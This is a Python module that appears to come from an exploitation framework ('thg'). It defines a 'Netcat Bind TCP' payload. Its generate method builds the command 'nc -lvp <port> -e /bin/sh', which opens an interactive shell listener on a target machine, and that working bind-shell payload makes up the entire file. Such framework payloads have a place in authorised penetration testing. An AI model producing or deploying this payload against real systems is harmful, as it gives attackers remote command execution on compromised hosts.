from thg.core.exploit import *
from thg.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload


class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Netcat Bind TCP",
        "description": "Creates interactive tcp bind shell by using netcat.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        ),
    }

    cmd = OptString("nc", "Netcat binary")
    shell_binary = OptString("/bin/sh", "Shell")

    def generate(self):
        return "{} -lvp {} -e {}".format(self.cmd,
                                         self.rport,
                                         self.shell_binary)
